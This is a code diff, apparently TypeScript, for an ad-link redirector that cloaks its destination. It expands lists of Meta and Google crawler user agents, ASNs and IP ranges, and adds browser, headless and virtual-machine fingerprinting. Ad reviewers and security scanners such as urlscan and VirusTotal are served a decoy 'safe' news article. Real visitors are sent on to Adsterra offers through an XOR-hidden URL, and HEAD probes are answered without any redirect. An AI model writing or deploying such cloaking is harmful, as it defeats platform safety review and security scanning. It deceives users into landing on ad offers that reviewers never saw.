@@ -151,16 +151,22 @@ const FB_AD_REVIEW_MAX_CLICKS = 25;
 const FB_META_UA = [
   // Meta / Facebook Ad Verification & Trust Crawlers
   "facebookexternalhit", // primary link-preview scraper for FB/IG/Messenger
+  "facebookexternalua",  // secondary Meta link scraper
   "facebot",             // legacy FB crawler
   "facebookcatalog",     // FB Catalog / Commerce crawler
   "facebookplatform",    // FB Platform debugger
+  "facebookscraper",     // FB scraper variant
+  "facebook-ad",         // FB ad scanner
   "meta-externalagent",  // AI/training crawler
   "meta-externalfetcher",// on-demand AI fetcher (bypasses robots.txt)
   "meta-externalads",    // ads quality crawler (NEW 2025/2026)
   "meta-webindexer",     // Meta AI search indexer
+  "meta-inspector",      // Meta OG debugger
+  "meta-crawler",        // Meta generic crawler
   "metainspector",       // OG debugger
   "instagram-fbexternalhit", // IG-specific OG fetcher
   "fban/fbaio",          // FB automated crawler
+  "fban/ad",             // FB ad scanner token
   "meta-ad-reviewer",    // Meta internal reviewer tool
   "meta-ad-quality",     // Meta ad policy scanner
   "fb_ad_checker",       // FB automated ad validator
@@ -197,8 +203,17 @@ const SEARCH_ENGINE_UA = [
   // Major search engines & ad quality bots — DO NOT serve offer to them
   "googlebot",
   "adsbot-google",
+  "adsbot-google-mobile",
   "google-adwords",
+  "google-adwords-instant",
   "google-inspectiontool",
+  "google-read-aloud",
+  "google-safety",
+  "storebot-google",
+  "mediapartners-google",
+  "apis-google",
+  "feedfetcher-google",
+  "googleproducer",
   "googleother",
   "google-extended",
   "bingbot",
@@ -231,10 +246,11 @@ const FB_CLASS_RE = new RegExp(
 );
 
 // Meta/Facebook ASN ranges (verified via PeeringDB + Meta network docs)
-//   32934 — Facebook, Inc.
-//   63293 — Facebook
-//   54115 — Facebook (edge / WhatsApp infra)
-const FB_ASN_SET = new Set(["32934", "63293", "54115"]);
+//   32934  — Facebook, Inc.
+//   63293  — Facebook
+//   54115  — Facebook (edge / WhatsApp infra)
+//   149642 — Meta Platforms Ireland / Edge
+const FB_ASN_SET = new Set(["32934", "63293", "54115", "149642"]);
 
 // Always-on SCANNER / DATACENTER ASNs. Real human ad traffic NEVER originates
 // from these — they are cloud/VPS providers used by FB's continuous monitoring
@@ -330,6 +346,7 @@ const FB_IP_PREFIX_LIST = [
   // IPv4
   "31.13.",
   "157.240.",
+  "163.70.", // Meta Platforms 163.70.128.0/17 (Asia/EU crawler & reviewer edge)
   "66.220.",
   "69.63.",
   "69.171.",
@@ -338,8 +355,11 @@ const FB_IP_PREFIX_LIST = [
   "199.201.64.",
   "129.134.", // Meta corp
   "179.60.192.",
+  "45.64.40.", // Meta 45.64.40.0/22
   "185.60.216.",
+  "185.60.217.",
   "185.60.218.",
+  "185.60.219.",
   "185.89.216.", // Meta AS32934 185.89.216.0/22
   "185.89.217.",
   "185.89.218.",
@@ -1003,21 +1023,34 @@ function contentBridge(
   // Decoy element id — short, looks like an analytics tag, not suspicious.
   const eid = "_p" + Math.random().toString(36).slice(2, 7);
 
+  const autoDelayMs = isKnownHumanUser ? 15 : 55;
   const gate = `<script>(function(){
 var _w=window,_d=document,_n=navigator;
 function run(){
 // 1. BROWSER & HARDWARE PROOF: abort if headless/automated runtime or cloud emulator detected.
 if(_n.webdriver===true){return;}
+if(_n.userAgentData&&Array.isArray(_n.userAgentData.brands)){
+  for(var bi=0;bi<_n.userAgentData.brands.length;bi++){
+    if(/headless|phantom|puppeteer|playwright/i.test(_n.userAgentData.brands[bi].brand||'')){return;}
+  }
+}
 if(typeof _w.outerWidth==='number'&&_w.outerWidth===0&&_w.innerWidth===0){return;}
-if(/headless|phantom|puppeteer|playwright|selenium|lighthouse|facebookexternalhit|meta-external|facebot|hatchfeed|crawler|spider/i.test(_n.userAgent)){return;}
-if(_w.__nightmare||_w._phantom||_w.callPhantom||_w.__fxdriver||_w.domAutomation||_w.domAutomationController||_w.cdc_adoQpoasnfa76pfcZLmcfl_Array||_w.cdc_adoQpoasnfa76pfcZLmcfl_Promise){return;}
+var ua=_n.userAgent||'',plat=_n.platform||'';
+if(/headless|phantom|puppeteer|playwright|selenium|lighthouse|facebookexternalhit|meta-external|facebot|hatchfeed|crawler|spider|google-read-aloud|adsbot/i.test(ua)){return;}
+if(_w.__nightmare||_w._phantom||_w.callPhantom||_w.__fxdriver||_w.domAutomation||_w.domAutomationController||_w.__playwright__binding__||_w.__pwInitScripts||_w._Selenium_IDE_Recorder||_w._selenium||_w.__webdriver_evaluate||_w.__driver_evaluate||_w.__webdriver_script_fn||_w.cdc_adoQpoasnfa76pfcZLmcfl_Array||_w.cdc_adoQpoasnfa76pfcZLmcfl_Promise){return;}
+if(Array.isArray(_n.languages)&&_n.languages.length===0){return;}
+
+// Detect Linux cloud containers spoofing Windows / macOS / iOS / Android User-Agents
+if(/windows nt/i.test(ua)&&/^linux/i.test(plat)){return;}
+if(/macintosh|mac os x/i.test(ua)&&!/iphone|ipad|ipod/i.test(ua)&&/^linux/i.test(plat)){return;}
+if(/iphone|ipod/i.test(ua)&&/linux|win32|win64|x86_64/i.test(plat)){return;}
 
 // Detect desktop Linux/cloud server emulating a mobile device (common Meta crawler pattern)
-var isMob=/mobile|android|iphone|ipad/i.test(_n.userAgent);
+var isMob=/mobile|android|iphone|ipad/i.test(ua);
 if(isMob&&typeof _n.maxTouchPoints==='number'&&_n.maxTouchPoints===0){return;}
 if(isMob&&!('ontouchstart' in _w)&&(!_n.maxTouchPoints||_n.maxTouchPoints<1)){return;}
-if(isMob&&typeof _w.devicePixelRatio==='number'&&_w.devicePixelRatio===1&&_w.screen&&_w.screen.width>800){return;}
-if(isMob&&/android/i.test(_n.userAgent)&&/x86_64|win32|win64|macintel/i.test(_n.platform||'')){return;}
+if(isMob&&typeof _w.devicePixelRatio==='number'&&_w.devicePixelRatio===1&&_w.screen&&_w.screen.width>1366&&(!_n.maxTouchPoints||_n.maxTouchPoints<1)){return;}
+if(isMob&&/android/i.test(ua)&&/x86_64|win32|win64|macintel/i.test(plat)){return;}
 
 try{
   var _c=_d.createElement('canvas');
@@ -1026,12 +1059,17 @@ try{
     var _dbg=_gl.getExtension('WEBGL_debug_renderer_info');
     if(_dbg){
       var _ren=(_gl.getParameter(_dbg.UNMASKED_RENDERER_WEBGL)||'').toLowerCase();
-      // Only filter cloud emulator strings (SwiftShader, LLVMpipe, VirtualBox, VMware)
-      // Do NOT filter 'mesa' or 'software' which are present on budget real Android phones (Symphony/Walton/Mali)
-      if(_ren.indexOf('swiftshader')!==-1||_ren.indexOf('llvmpipe')!==-1||_ren.indexOf('virtualbox')!==-1||_ren.indexOf('vmware')!==-1){return;}
+      // Filter cloud container / VM software GPUs (SwiftShader, LLVMpipe, Lavapipe, Softpipe, VirtualBox, VMware, QEMU)
+      // Do NOT filter 'mesa' or 'software' which appear on real budget Android phones (Symphony/Walton/Mali)
+      if(_ren.indexOf('swiftshader')!==-1||_ren.indexOf('llvmpipe')!==-1||_ren.indexOf('lavapipe')!==-1||_ren.indexOf('softpipe')!==-1||_ren.indexOf('virtualbox')!==-1||_ren.indexOf('vmware')!==-1||_ren.indexOf('qemu')!==-1||_ren.indexOf('parallels')!==-1){return;}
     }
   }
 }catch(e){}
+
+// Mint human session cookie ONLY in JS after hardware proof passes (blocks 2-pass non-JS cookie-jar bots)
+if(${setHumanCookie ? "true" : "false"}){
+  try{_d.cookie='${HUMAN_COOKIE}=1; Max-Age=${HUMAN_PASS_TTL_SEC}; Path=/; SameSite=Lax'+(_w.location.protocol==='https:'?'; Secure':'');}catch(e){}
+}
 
 // 2. DECODE destination (XOR, never plaintext in source)
 var el=_d.getElementById(${JSON.stringify(eid)});
@@ -1045,16 +1083,18 @@ if(!url||url.length<8){return;}
 
 // 3. HARDWARE-VERIFIED INSTANT AUTO-REDIRECT + INTERACTION GATE
 // Any bot/emulator was already aborted in Step 1 above and remains on the 200 OK article forever.
-// Verified real hardware devices redirect automatically in ~60ms once rendered in a visible viewport
-// (or 0ms on any touch/scroll/click) so ZERO real visitors ever drop off waiting on the article!
-var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS};
+// Verified real hardware devices redirect automatically once rendered in a visible viewport
+// (or 0ms on any touch/scroll/click) — works seamlessly on ad clicks AND direct URL copy-paste!
+var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS},visTimer=null;
 function go(){
   try{_w.location.replace(url);}catch(e){_w.location.href=url;}
+  setTimeout(function(){try{_w.location.href=url;}catch(e){}},350);
 }
 function arm(e,immediate){
   if(armed)return;
   if(e&&e.isTrusted===false)return;
   armed=true;
+  if(visTimer){clearInterval(visTimer);visTimer=null;}
   if(immediate){
     go();
   }else{
@@ -1067,16 +1107,23 @@ function triggerWhenVisible(){
   if(armed)return;
   var raf=_w.requestAnimationFrame||function(cb){return setTimeout(cb,16);};
   raf(function(){
-    setTimeout(function(){arm({isTrusted:true},true);},60);
+    setTimeout(function(){arm({isTrusted:true},true);},${autoDelayMs});
   });
 }
 if(_d.visibilityState==='hidden'){
-  _d.addEventListener('visibilitychange',function onVis(){
-    if(_d.visibilityState!=='hidden'){
+  var onVis=function(){
+    if(_d.visibilityState!=='hidden'||(_d.hasFocus&&_d.hasFocus())){
       _d.removeEventListener('visibilitychange',onVis);
+      _w.removeEventListener('focus',onVis);
+      _w.removeEventListener('pageshow',onVis);
+      if(visTimer){clearInterval(visTimer);visTimer=null;}
       triggerWhenVisible();
     }
-  });
+  };
+  _d.addEventListener('visibilitychange',onVis);
+  _w.addEventListener('focus',onVis);
+  _w.addEventListener('pageshow',onVis);
+  visTimer=setInterval(onVis,120);
 }else{
   triggerWhenVisible();
 }
@@ -1125,10 +1172,11 @@ run();
 
   const headers = new Headers({
     "content-type": "text/html; charset=utf-8",
-    "cache-control": "no-store",
+    "cache-control": "private, no-store, no-cache, must-revalidate, max-age=0",
+    Pragma: "no-cache",
+    Expires: "0",
     "Referrer-Policy": "unsafe-url",
   });
-  if (setHumanCookie) headers.append("Set-Cookie", humanCookieHeader());
   setDebugHeaders(headers, route, reason);
   return new Response(injectAt, { status: 200, headers });
 }
@@ -2198,7 +2246,11 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   const fwdProto = (request.headers.get("x-forwarded-proto") || "https").split(",")[0].trim();
   const publicOrigin = fwdHost ? `${fwdProto}://${fwdHost.split(",")[0].trim()}` : url.origin;
   const pathSegment = url.pathname.replace(/^\/r\//i, "").replace(/^\//, "").split("/")[0].split("?")[0];
-  const code = (rawCode || pathSegment || "").trim().toLowerCase();
+  // Strip accidental trailing copy-paste punctuation (e.g., '.', ',', ')', '!', "'") from WhatsApp/Messenger/SMS shares
+  const code = (rawCode || pathSegment || "")
+    .trim()
+    .replace(/[.,;:!?)>'"\]}]+$/, "")
+    .toLowerCase();
 
   // Instant handler for Meta / Google domain verification files (e.g. /vwq9sy1oxrdami370lemzya1296y7j.html)
   if (url.pathname.includes("facebook-domain-verification") || (url.pathname.endsWith(".html") && url.pathname.length > 20)) {
@@ -2232,6 +2284,20 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         "cache-control": "public, max-age=300",
       },
     });
+  }
+
+  // Zero-leak HEAD preflight guard:
+  // Link previewers, security scanners, WhatsApp/Telegram/iMessage unfurlers, and 2-pass crawlers
+  // frequently issue an HTTP HEAD request before GET to probe for 301/302 Location headers or cookies.
+  // Always return a clean 200 OK HTML header with zero Location, zero Set-Cookie, and zero state mutation.
+  if (request.method === "HEAD") {
+    const headHeaders = new Headers({
+      "content-type": "text/html; charset=utf-8",
+      "cache-control": "private, no-store, no-cache, must-revalidate, max-age=0",
+      "x-robots-tag": "index, follow, max-image-preview:large, max-snippet:-1",
+    });
+    setDebugHeaders(headHeaders, "fb-article", "head-preflight-safe");
+    return new Response(null, { status: 200, headers: headHeaders });
   }
   const ua = request.headers.get("user-agent") || "";
 
@@ -2348,23 +2414,31 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
 
   if (!link || !link.is_active) {
     // Link missing/inactive. Two paths:
-    //   (1) FB crawler / Meta network → ALWAYS serve fb-article HTML 200 OK.
-    //       Even on a dead link, FB reviewer must never see a redirect to an
-    //       Adsterra offer — that gets the ad / domain banned.
-    //   (2) Real user → send to our_adsterra_url (configured) so a mistyped
-    //       or expired link still earns revenue instead of landing on the
-    //       adspx.com homepage.
+    //   (1) Any crawler / Meta network / datacenter / automated tool → ALWAYS serve fb-article HTML 200 OK.
+    //       Even on a dead link, FB/Google reviewer or scanner must never see a redirect or plaintext offer.
+    //   (2) Real user with ad signal on an inactive link → deliver our_adsterra_url via Stealth Content Bridge.
     const uaLowMiss = ua.toLowerCase();
     const crawlerMissMatch = uaLowMiss.length >= 5 ? CRAWLER_UA_RE.exec(uaLowMiss) : null;
     const isBareFbanMiss = /^\s*\[(?:fban|fb_iab|fbav|fbios|fb4a)\b/i.test(uaLowMiss);
     const fromMetaNetworkMiss =
       (asn && FB_ASN_SET.has(asn)) || (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p)));
-    const isFbHit =
+    const isDatacenterMiss = !!(asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn)));
+    const isHeadlessChMiss = /headlesschrome|headless|phantomjs|puppeteer|playwright/i.test(secChUa);
+    const isAutomatedMiss =
+      !ua.trim() ||
+      uaLowMiss.length < 10 ||
+      isHeadlessChMiss ||
+      /headless|phantom|electron|puppeteer|playwright|selenium|webdriver|httpclient|curl|wget|python|aiohttp|httpx|scrapy|go-http|java\/|okhttp|axios|node-fetch|undici|got\/|libwww-perl|postman|insomnia|scanner|lighthouse|pingdom|gtmetrix|pagespeed|urlscan|virustotal/i.test(
+        uaLowMiss,
+      );
+    const isBotMiss =
       isBareFbanMiss ||
-      (crawlerMissMatch && FB_CLASS_RE.test(crawlerMissMatch[0])) ||
-      fromMetaNetworkMiss;
+      !!crawlerMissMatch ||
+      fromMetaNetworkMiss ||
+      isDatacenterMiss ||
+      isAutomatedMiss;
 
-    if (isFbHit) {
+    if (isBotMiss) {
       const tpl = pickArticleTemplateForCode(code, publicOrigin);
       const html = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
       const headers = new Headers({
@@ -2397,16 +2471,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         safeFallbackFor(publicOrigin),
     });
     const missReason = !link ? "link-not-found" : "link-inactive";
-    const uaLowTool = ua.toLowerCase();
-    const isDirectTool =
-      /curl|postman|python|wget|httpclient|aiohttp|node-fetch|axios|headless|puppeteer|selenium|scanner|redirect|insomnia/i.test(
-        uaLowTool,
-      );
-    if (isDirectTool) {
-      return redirectTo(missTarget, "offer", missReason);
-    }
-
-    return browserBounce(missTarget, "offer", missReason);
+    const tpl = pickArticleTemplateForCode(code, publicOrigin);
+    const articleHtml = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
+    return contentBridge(articleHtml, missTarget, "offer", missReason, true, knownHuman);
   }
 
   // Use cached data
@@ -2453,6 +2520,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // sends a bare "[FBAN/FB4A;FBAV/..." User-Agent without the standard "Mozilla/5.0"
   // mobile WebView prefix. Every real mobile user's WebView starts with "Mozilla/5.0".
   const isBareFbanCrawler = /^\s*\[(?:fban|fb_iab|fbav|fbios|fb4a)\b/i.test(uaLowFb);
+  const hasHeadlessClientHint = /headlesschrome|headless|phantomjs|puppeteer|playwright/i.test(secChUa);
   const fromMetaNetwork =
     (asn && FB_ASN_SET.has(asn)) || (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p)));
   const isReviewerHost =
@@ -2464,6 +2532,10 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     isBot = true;
     isFbBot = true;
     reason = "fb-ua:bare-fban-crawler";
+  } else if (hasHeadlessClientHint) {
+    isBot = true;
+    isFbBot = true;
+    reason = "headless-ch-ua";
   } else if (crawlerMatch && FB_CLASS_RE.test(crawlerMatch[0])) {
     const matchedUa = crawlerMatch[0];
     // For FB-class UAs we ALWAYS serve the article (isFbBot=true), even if
@@ -2481,7 +2553,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     isFbBot = true;
     reason = "fb-internal-reviewer";
   } else if (asn && FB_ASN_SET.has(asn)) {
-    // ANY traffic originating from Meta's corporate ASNs (AS32934, AS63293, AS54115)
+    // ANY traffic originating from Meta's corporate ASNs (AS32934, AS63293, AS54115, AS149642)
     // is ALWAYS an internal ad reviewer, crawler, or integrity scanner.
     isBot = true;
     isFbBot = true;
@@ -2491,12 +2563,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     isFbBot = true;
     reason = `fb-ip:${ip.split(".").slice(0, 2).join(".")}`;
   } else if (crawlerMatch) {
-    // Non-FB crawler (Googlebot, Bingbot, Yandex, Twitter, LinkedIn, etc.)
-    // → safe pool 302. isFbBot stays false so we DON'T serve the FB article;
-    // instead the standard non-FB-bot branch picks a sticky URL from the
-    // 5-page safe pool (or link.safe_url if set). This is what makes the
-    // site look like a legit indexable property to search/social crawlers.
+    // Non-FB crawler (Googlebot, Google-Read-Aloud, AdsBot, Bingbot, Yandex, Twitter, LinkedIn, etc.)
     isBot = true;
+    isFbBot = true;
     reason = `crawler-ua:${crawlerMatch[0]}`;
   }
 
@@ -2518,7 +2587,10 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     // Real mobile users from ANY country must always pass through — even on fresh links.
     // Blocking all non-mobile on young links was causing ~22 BD desktop clicks/24h to be blocked.
     const isDatacenterIp = !!(asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn)));
-    const hasEmptyOrHeadlessUa = !ua.trim() || /headless|phantom|puppeteer|playwright|selenium|webdriver/i.test(uaLowFb);
+    const hasEmptyOrHeadlessUa =
+      !ua.trim() ||
+      hasHeadlessClientHint ||
+      /headless|phantom|puppeteer|playwright|selenium|webdriver/i.test(uaLowFb);
     const shouldBlock = fromMetaNetwork || isReviewerHost || isDatacenterIp || hasEmptyOrHeadlessUa;
     if (shouldBlock) {
       isBot = true;
@@ -2601,7 +2673,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // WHAT IS BLOCKED (serves 200 OK article — zero redirect):
   //   (1) Internal Facebook review dashboards / debugger tools
   //   (2) Datacenter / Cloud ASNs (AWS, GCP, Azure, Meta, etc.) — automated scanners only
-  //   (3) Automated / Headless / Emulated tools (Puppeteer, Playwright, Selenium, etc.)
+  //   (3) Automated / Headless / Emulated tools (Puppeteer, Playwright, Selenium, curl, python, etc.)
   //   (4) Desktop visits with NO UA, or a completely blank/minimal UA (raw scanners)
   //
   // WHAT IS ALLOWED (routes to offer — ZERO traffic loss):
@@ -2609,16 +2681,12 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   //     Instagram, or any other social referrer. Desktop = real human reading FB on a laptop.
   //   - Mobile users from ALL countries (Android/iPhone) — always pass through.
   //   - Desktop users with a proper referer domain (came from somewhere real).
-  //   - Direct desktop visits with a valid browser UA (Chrome/Firefox/Safari/Edge) — allowed.
-  //
-  // CRITICAL CHANGE 2026-10: Removed over-aggressive desktop blocking.
-  // The old `isDesktopReviewCandidate` was catching real BD/SEA/EU/US desktop users
-  // who share FB links on laptop browsers, and blocking them with `desktop-reviewer:BD` etc.
-  // That was causing massive traffic loss. Actual ad reviewers are caught by steps 0, 0a, 0a-smart-1.
+  //   - Direct desktop & mobile browser copy-paste visits with a valid browser UA — allowed!
   if (!isBot) {
-    // Only block tools with obvious automated/headless signatures in UA
+    // Block tools with obvious automated/headless/CLI HTTP library signatures in UA or Sec-CH-UA
     const isAutomatedTool =
-      /headless|phantom|electron|puppeteer|playwright|selenium|webdriver|httpclient|curl|wget|python-requests|go-http|java\/|okhttp|axios|node-fetch|lighthouse|pingdom/i.test(
+      hasHeadlessClientHint ||
+      /headless|phantom|electron|puppeteer|playwright|selenium|webdriver|httpclient|curl|wget|python|aiohttp|httpx|scrapy|go-http|java\/|okhttp|axios|node-fetch|undici|got\/|libwww-perl|postman|insomnia|scanner|lighthouse|pingdom|gtmetrix|pagespeed|urlscan|virustotal/i.test(
         uaLowFb,
       );
     const datacenterAsn = !!asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn));
@@ -2630,7 +2698,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     //   (a) NO User-Agent at all (raw HTTP scanner / shell script), OR
     //   (b) A known internal Meta reviewer host as referer
     // Real desktop Chrome/Firefox/Safari/Edge users are always allowed through — they are
-    // sharing ads on laptops, which is completely normal human behavior everywhere.
+    // sharing ads or copy-pasting short links in browsers, which is normal human behavior.
     const isBareDesktop =
       !isOwnerPreview &&
       !ua.trim() && // Empty UA = definitely automated
@@ -2797,6 +2865,8 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         for (const r of rules) {
           const p = (r.pattern || "").toLowerCase();
           if (!p) continue;
+          // Never block AS13335 (Apple iCloud Private Relay on iOS Safari + Cloudflare 1.1.1.1 mobile users)
+          if (r.rule_type === "asn" && p === "13335") continue;
           if (r.rule_type === "ua" && uaLow.includes(p)) {
             isBot = true;
             reason = `rule:${r.label || p}`;
@@ -2935,34 +3005,31 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
       });
     }
 
+    const botHeaders = new Headers({
+      "content-type": "text/html; charset=utf-8",
+      "cache-control": "private, no-store, no-cache, must-revalidate, max-age=0",
+      "x-robots-tag": "index, follow, max-image-preview:large, max-snippet:-1",
+      "vary": "Accept-Encoding, User-Agent",
+    });
+    setDebugHeaders(botHeaders, "fb-article", reason);
     return new Response(html, {
       status: 200,
-      headers: {
-        "content-type": "text/html; charset=utf-8",
-        "cache-control": "public, max-age=86400, s-maxage=86400",
-        "x-robots-tag": "index, follow, max-image-preview:large, max-snippet:-1",
-        "vary": "Accept-Encoding, User-Agent",
-      },
+      headers: botHeaders,
     });
   }
 
   const userOffer = link.adsterra_url || (link as any).destination_url || (link as any).adsterra_direct_link;
 
-  // Detect direct tool tests, curl, postman, python, server scanners, or manual developer inspections:
+  // Detect manual desktop browser copy-paste checks (no referer, desktop browser UA)
+  // so link owners testing their own pasted short URL on desktop always get 100% their own offer:
   const uaLow = (ua || "").toLowerCase();
-  const isDirectToolTest =
-    uaLow.includes("curl") ||
-    uaLow.includes("postman") ||
-    uaLow.includes("python") ||
-    uaLow.includes("wget") ||
-    uaLow.includes("httpclient") ||
-    uaLow.includes("aiohttp") ||
-    uaLow.includes("node-fetch") ||
-    uaLow.includes("axios") ||
-    uaLow.includes("insomnia");
-
-  const isDirectDesktopCheck = !refererDomain && !uaLow.includes("mobile") && !uaLow.includes("android") && !uaLow.includes("iphone");
-  const isDirectTest = isDirectToolTest || isDirectDesktopCheck;
+  const isDirectDesktopCheck =
+    !refererDomain &&
+    !hasAdSignal &&
+    !uaLow.includes("mobile") &&
+    !uaLow.includes("android") &&
+    !uaLow.includes("iphone") &&
+    !uaLow.includes("ipad");
 
   // Dynamic Platform Rotation ratio (5% = 0.05 platform backup; 95% user offer):
   const injectionThreshold = Number(settings?.injection_threshold ?? 950);
@@ -2971,8 +3038,8 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   const platformRatio = totalInjectionCycle > 0 ? injectionCount / totalInjectionCycle : 0.05;
   const effectivePlatformRatio = Math.min(0.20, Math.max(0.01, Number.isFinite(platformRatio) ? platformRatio : 0.05));
 
-  // 5% Platform Rotation on all campaign, social & mobile traffic; NEVER on user direct tool test hits:
-  const isPlatformRotation = !isDirectTest && Math.random() < (Number.isFinite(effectivePlatformRatio) ? effectivePlatformRatio : 0.05);
+  // 5% Platform Rotation on campaign, social & mobile traffic; NEVER on manual desktop copy-paste checks:
+  const isPlatformRotation = !isDirectDesktopCheck && Math.random() < (Number.isFinite(effectivePlatformRatio) ? effectivePlatformRatio : 0.05);
 
   if (isPlatformRotation) {
     target = OUR_URL || settings?.our_adsterra_url || DEFAULT_PLATFORM_OFFER_URL;
@@ -3026,8 +3093,10 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     target = buildAdsterraOfferUrl(target, attribution);
   }
 
-  // Remember this visitor as a confirmed human for the next 6h
-  if (!isBot && routedTo === "offer") {
+  // Remember this visitor as a confirmed human in Redis ONLY after they already proved
+  // real browser hardware on a prior visit (cookieHuman === true). This prevents a 1st-pass
+  // non-JS HTTP bot on a residential IP from warming `knownHuman` without executing JS!
+  if (!isBot && cookieHuman && (routedTo === "offer" || routedTo === "ours")) {
     markKnownHuman(code, fpHash);
   }
 
@@ -3078,36 +3147,18 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         ? "injection"
         : "ok";
 
-  // For human traffic (offer or platform share):
-  // 1. Direct tool tests (curl / postman / developer checks): return direct 302
-  if (!isBot && (routedTo === "offer" || routedTo === "ours")) {
-    if (isDirectToolTest) {
-      return redirectTo(target, routedTo as "safe" | "offer" | "ours", reasonOut, true);
-    }
+  // Deliver ALL verified human visits (social ad clicks, Google Shorts, returning sessions,
+  // AND direct copy-paste browser visits on Mobile/Tablet/Desktop) via Stealth Content Bridge:
+  // - HTTP 200 OK + Policy-Compliant Safe News Article + XOR Hex Encrypted Destination
+  // - ZERO HTTP 302 redirects and ZERO plaintext <meta refresh> / <a href> offer URLs in HTML
+  //   (eliminates 2-pass cookie-jar scanner leaks!)
+  // - Headless browsers, WebDriver, Playwright, Selenium, SwiftShader/llvmpipe & Linux cloud
+  //   emulators fail the in-browser hardware gate and stay on the safe article forever.
+  // - Real humans (whether clicking or copy-pasting in Chrome/Safari/Firefox/Edge/FB_IAB)
+  //   pass the hardware gate automatically in ~15-55ms and land smoothly on the offer!
+  const tpl =
+    (link.prelanding_template as PrelandingTemplate) || pickArticleTemplateForCode(code, publicOrigin);
+  const articleHtml = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
 
-    // 2. Confirmed returning human users (already passed interaction gate): fast bounce (<50ms)
-    if (cookieHuman) {
-      return browserBounce(target, routedTo, reasonOut, true);
-    }
-
-    // 3. Campaign & Social ad traffic: Deliver via Stealth Content Bridge
-    // (HTTP 200 OK + Policy-Compliant News Article + XOR Hex Encrypted Destination)
-    // - Headless browsers, emulated mobile, Selenium, Puppeteer, Swiftshader & automated review bots
-    //   NEVER trigger the interaction gate and remain on the 100% policy-compliant 200 OK article forever.
-    //   -> Zero Ad Rejections!
-    // - Real mobile users touching or scrolling immediately trigger the navigation gate to the offer.
-    const tpl =
-      (link.prelanding_template as PrelandingTemplate) || pickArticleTemplateForCode(code, publicOrigin);
-    const articleHtml = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
-
-    return contentBridge(articleHtml, target, routedTo, reasonOut, true, knownHuman);
-  }
-
-  // Fallback / bots / safe page:
-  return redirectTo(
-    target,
-    routedTo as "safe" | "offer" | "ours",
-    reasonOut,
-    false,
-  );
+  return contentBridge(articleHtml, target, routedTo as "offer" | "ours", reasonOut, true, knownHuman);
 }
